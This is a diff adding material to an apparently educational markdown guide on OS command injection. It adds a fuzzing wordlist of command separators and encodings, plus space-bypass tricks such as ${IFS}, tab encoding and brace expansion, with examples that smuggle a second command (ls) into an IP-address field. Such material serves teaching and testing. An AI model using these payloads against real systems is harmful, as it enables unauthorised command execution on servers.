@@ -28,6 +28,30 @@ It is a web vulnerability that allows an attacker to take advantage of that made
 
 Active command injection will return the response to the user.  It can be made visible through several HTML elements. That means when a attacker execute :eyes: "system command "  like ls ,server will return result of ls .(Attacker will see the result of ls ) .It is so easy to execute . 
 
+#### OS Command Injection Payloads link:https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+
+## Fuzzing wordlist using Burp Intruder
+          
+                 ;
+                \n   -------- %0a
+                 &
+                 |
+                 ||
+                 &&
+                 ''
+                 $()
+                 %26
+                 %26%26
+                 %3b
+                 %7c%7c
+                 %60%60
+## Bypass Space for OS Command Injection
+                    
+                    +
+                    %09 ------- tab ------ example: 127.0.0.1;ls%09-la
+                    ${IFS}
+                    {ls,-la} ------ branch expansion -------- example:127.0.0.1%0a{ls,-la}
+                    
 
 ### Blind OS Command Injection :
       
